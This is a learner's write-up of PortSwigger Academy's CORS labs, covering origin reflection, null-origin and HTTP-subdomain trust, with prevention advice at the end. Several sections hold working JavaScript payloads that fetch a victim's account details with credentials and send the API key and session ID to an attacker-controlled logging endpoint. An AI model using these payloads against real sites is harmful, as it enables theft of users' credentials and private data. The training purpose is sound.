# Cross-origin resource sharing (CORS) [PortSwigger Academy]

<sup>This write-up covers the Cross-origin resource sharing (CORS) section of Web Security Academy by PortSwigger.</sup>

## What is CORS (cross-origin resource sharing)?

Cross-origin resource sharing (CORS) is a browser feature that allows controlled access to resources from different domains, offering more flexibility than the same-origin policy (SOP). However, if not properly configured, it can open the door to cross-domain attacks. It's important to note that CORS is not a defense mechanism against cross-origin threats like cross-site request forgery (CSRF)

## Same-origin policy

The same-origin policy (SOP) is a strict security measure designed to limit how a website can interact with resources from different domains. Introduced to prevent malicious cross-site behaviors --- like one site accessing private data from another --- it permits sending requests across domains but blocks access to the returned responses.

## Relaxation of the same-origin policy

Due to the strict limitations of the same-origin policy, various methods have been developed to work around its restrictions. Many websites need to communicate with subdomains or third-party services, requiring some level of cross-origin access. Cross-origin resource sharing (CORS) enables a controlled relaxation of these rules. It works by using a set of HTTP headers that specify trusted origins and access permissions, which are exchanged between the browser and the external site the browser is attempting to reach. 

## Vulnerabilities arising from CORS configuration issues

Many contemporary websites implement CORS to permit access from subdomains and trusted external sources. However, these implementations are sometimes flawed or excessively permissive to maintain functionality, which can introduce security vulnerabilities that attackers may exploit. 

### Lab: CORS vulnerability with basic origin reflection

Use Burp's browser to log in to lab as `wiener:peter` and access account page. 

On my account page, you can see text `Your API Key is: YOUR-API-KEY`. Now check the __Proxy__ > __HTTP history__ tab and see, that it is retrieved via `GET /accountDetails` request, the response of which includes an `Access-Control-Allow-Credentials` header, and response body looks liek this:

```json
{
  "username": "wiener",
  "email": "",
  "apikey": "YOUR-API-KEY",
  "sessions": [
    "YOUR-SESSION-ID"
  ]
}
```

This suggests, that this website might support CORS. Right-click this request and send it to __Repeater__. Add header `Origin: https://example.com` in the request and click Send. Observe, that origin is reflected in `Access-Control-Allow-Origin` header. 

Go to exploit server and enter the following HTML into "Body" section:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

`var req = new XMLHttpRequest();` --- This creates a new XMLHttpRequest object, used to send HTTP requests from the browser _(AJAX request)_. 
`req.onload = reqListener;` --- When the request completes successfully, the browser will call the `reqListener()` function with the response.
`req.open('get', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true);` --- Prepares `GET` request to the URL `/accountDetails` on the specified domain (`YOUR-LAB-ID.web-security-academy.net`), in asynchronous mode (`true`). This endpoint returns private user information like name, email, or account data. 
`req.withCredentials = true;` --- This tells the browser to __include cookies and session tokens__ with the request. This is crucial for stealing authenticated data because it ensures the request is sent as the victim user. 
`req.send();` --- Sends the request to the server.
```javascript
function reqListener() {
  location='/log?key='+this.responseText;
};
```
- Once the response is received this function is triggered.
- It redirects the victim's browser to `/log?key=...`, appending the full response body (sensitive account data) as a `GET` parameter.
- If the attacker controls the `/log` endpoint, they can capture the response data when the redirect happens.

Once you paste this HTML, click "Store" and then "View exploit". Go to __Proxy__ > __HTTP history__ and click on the latest `GET /log?key=...` request. As you can see your API ended up in the URL along with your session ID:

```
GET /log?key={%20%20%22username%22:%20%22wiener%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22{YOUR-API-KEY}%22,%20%20%22sessions%22:%20[%20%20%20%20%22{YOUR-SESSION-ID}%22%20%20]} HTTP/2
```

Go back to the exploit server and click "Deliver exploit to victim". Click "Access log" and find victim's API key in the URL to solve the lab. 

> NOTE: Check out [walkthrough](cors_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy

### Server-generated ACAO header from client-specified Origin header

Some applications need to grant access to multiple external domains. Managing a strict list of allowed origins can be time-consuming, and errors may disrupt functionality. To simplify this, some developers take a shortcut by effectively permitting any domain to access the application. one common method involves dynamically setting the `Access-Control-Allow-Origin` header to match the `Origin` header from incoming requests. For example, if a request comes from `https://malicious-website.com` with valid session-cookie, the server might respond with headers like:

```http
Access-Control-Allow-Origin: https://malicious-website.com  
Access-Control-Allow-Credentials: true
```

This response tells the browser to allow the requesting (malicious) domain to access sensitive data and include credentials (like cookies) in requests. If the application reflects any origin in this way, _any_ domain can gain access to potentially sensitive content. An attacker can exploit this by embedding the following script on their site, which silently sends a cross-origin request and logs the response data:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

This technique allows attackers to extract confidential information such as session data or CSRF tokens without user awareness.

### Errors in parsing Origin headers

Some applications handle cross-origin access by maintaining a whitelist of trusted origins. When CORS request is received the application checks the `Origin` header against this whitelist. If the origin is found on the list, the server includes it in the `Access-Control-Allow-Origin` response header, thereby granting access. For instance, a request like:

```
GET /data HTTP/1.1  
Host: normal-website.com  
Origin: https://innocent-website.com  
```

would be processed by checking whether `https://innocent-website.com` is on the approved list. If it is, the response would include:

```
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: https://innocent-website.com  
```

This approach enables controlled cross-origin access based on predefined trusted domains. 
### Errors parsing Origin headers - Continued

Implementing CORS origin whitelists can be error-prone. Some organizations aim to allow access from all their subdomains, including the ones that might be created in the future, while others permit access from partner domains and their subdomains. These rules are often enforced using string matching or regular expressions, which can easily be misconfigured and unintentionally allow access to unauthorized domains. 

For instance if an application is configured to allow any domain ending in `normal-website.com`, an attacker could exploit this by registering `hackersnormal-website.com`, which would match the rule. Similarly, if the rule permits domains starting with `normal-website.com`, then `normal-webiste.com.evil-user.net` could be used to bypass restrictions and gain unintended access.

### Whitelisted null origin value

The Origin header specification allows for the value `null`, which browsers may send in several atypical scenarios. These include cross-origin redirects, requests initiated from serialized data, requests using the `file:` protocol, and sandboxed cross-origin requests. 

### Lab: CORS vulnerability with trusted null origin

In Burp's browser, navigate to the lab, log in as `wiener:peter` and go to `/my-account`. Review the __Proxy__ > __HTTP history__ and click the `GET /accountDetails` request. 

_Response:_

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "YOUR-API-KEY",
  "sessions": [
    "YOUR-SESSION-ID"
  ]
}
```

Observe, that the key is retrieved via an AJAX request and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. 

Right-click the request and select "Send to Repeater". Set a new header `Origin: null` and click Send. 

Observe, that the "null" origin is reflected in the `Access-Control-Allow-Origin` header. Go to the exploit server and enter the following HTML in the "Body" input:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

The `iframe` tag is used because this sandbox generates a `null` origin. Click "Store" and then "View exploit". Go to __Proxy__ > __History__ and observe the `GET /log?key=...` request URI:

```
GET /log?key=%7B%0A%20%20%22username%22%3A%20%22wiener%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22{YOUR-API-KEY}%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%22{YOUR-SESSION-ID}%22%0A%20%20%5D%0A%7D HTTP/2
```

This means that the exploit sent an API key inside a query to an external domain. 

Go back to exploit server and click "Deliver exploit to victim". Go to "Access log" and retrieve the victim's API key to solve the lab.

### Exploiting XSS via CORS trust relationships

Even when CORS is properly configured, it still creates a trust relationship between two origins. If a trusted origin is vulnerable to cross-site scripting (XSS), an attacker could exploit that vulnerability to inject JavaScript, which then uses CORS to access and extract sensitive data from the site that trusts the compromised origin. 

### Exploiting XSS via CORS trust relationships - Continued

Consider this request:

```
GET /api/requestApiKey HTTP/1.1  
Host: vulnerable-website.com  
Origin: https://subdomain.vulnerable-website.com  
Cookie: sessionid=...  
```

If the server replies with:

```
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com  
Access-Control-Allow-Credentials: true  
```

An attacker who discovers an XSS vulnerability on `subdomain.vulnerable-website.com` could exploit it to steal the API key. By injecting a malicious script --- such as placing `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>` --- they could trigger a cross-origin request from the trusted subdomain to retrieve sensitive data. 

### Breaking TLS with poorly configured CORS

Imagine an application that consistently enforces HTTPS but includes a trusted subdomain in its CORS whitelist that only uses plain HTTP. For example, if the application receives this request: 

```
GET /api/requestApiKey HTTP/1.1  
Host: vulnerable-website.com  
Origin: http://trusted-subdomain.vulnerable-website.com  
Cookie: sessionid=...  
```

It might respond with:

```
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com  
Access-Control-Allow-Credentials: true  
```

This configuration creates a security risk, as the use of HTTP on the subdomain exposes the data to interception or tampering by network attackers. 

### Lab: CORS vulnerability with trusted insecure protocols

In Burp's browser navigate to the lab, log in as `wiener:peter` and access `/my-account` page. 

Review __Proxy__ > __History__ and observe that your API key is retrieved via an AJAX request to `/accountDetails`, and the respone contains the `Access-Control-Allow-Credentials` header:

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "YOUR-API-KEY",
  "sessions": [
    "YOUR-SESSION-ID"
  ]
}
```

This suggests that it may support CORS. Right-click the request and select "Send to Repeater", add the following header to the request: `Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net` and click Send. 

In the response, observe, that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain:

```
GET /?productId=1&storeId=1 HTTP/1.1
Host: stock.YOUR-LAB-ID.web-security-academy.net
```

Let's test `productId` parameter for XSS, craft the following URL and enter it in the browser:

```
https://stock.YOUR-LAB-ID.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

A JavaScript alert is loaded in URL encoded format as a value of query parameter `productId`. If going to this URL shows an alert, then the subdomain is vulnerable to the XSS!

Go to exploit server now and enter the following HTML in "Body" section:

```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Replace placeholders with your credentials and click "Store". Then click "View exploit". Observe that you have landed on a log page and your API key is in the URL. Specifically:

```
GET /exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key={%20%20%22username%22:%20%22wiener%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22{YOUR-API-KEY}%22,%20%20%22sessions%22:%20[%20%20%20%20%22{YOUR-SESSION-ID}%22%20%20]} HTTP/2
```

Go back to exploit server and click "Deliver exploit to vicitm". Click "Access log" and retrieve victim's API key to solve the lab.

### Intranets and CORS without credentials

Most CORS attacks depend on the server including the `Access-Control-Allow-Credentials: true` header in its response. Without this header, the browser won't send the user's cookies, so an attacker would only be able to access public, unauthenticated data --- something they could obtain directly by visiting the site themselves. However, a notable exception arises with internal websites hosted on private IP ranges, such as those within an organization's intranet. These internal sites often have weaker security measures, making them attractive targets. In such cases, attackers may exploit cross-origin requests from a public site to a private one, for example:

```
GET /reader?url=doc1.pdf  
Host: intranet.normal-website.com  
Origin: https://normal-website.com  
```

If the server responds with:

```
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: *  
```

Then the attacker can read the response even without credentials, potentially exposing sensitive internal information. 

## How to prevent CORS-based attacks.

CORS vulnerabilities typically stem from misconfigured settings, making their prevention largely a matter of proper configuration. The following sections outline key strategies for effectively defending against CORS-based attacks.

### Proper configuration of cross-origin requests

When a web resource holds sensitive data, the `Access-Control-Allow-Origin` header should explicitly specify the trusted origin to ensure proper access control.

### Only allow trusted sites

It may seem clear, but the origins listed in the `Access-Control-Allow-Origin` header should only include trusted sites. Specifically, dynamically reflecting origins from cross-origin requests without proper validation is highly exploitable and should be avoided.

### Avoid whitelisting null

Refrain from using the `Access-Control-Allow-Origin: null` header. Cross-origin resource requests from internal documents and sandboxed requests can specify a null origin. CORS headers should be properly configured to specify trusted origins for both private and public servers.

### Avoid wildcards in internal networks

Do not use wildcards in internal networks. Relying solely on network configuration to secure internal resources is inadequate, as internal browsers can access untrusted external domains.

### CORS is not a substitute for server-side security policies

CORS governs browser behavior but should never replace server-side protection for sensitive data. An attacker can still forge a request from a trusted origin. As such, web servers must implement additional safeguards, like authentication and session management, alongside properly configured CORS.

> Next write-up: [NoSQL injection](../psa_nosql/README.md)
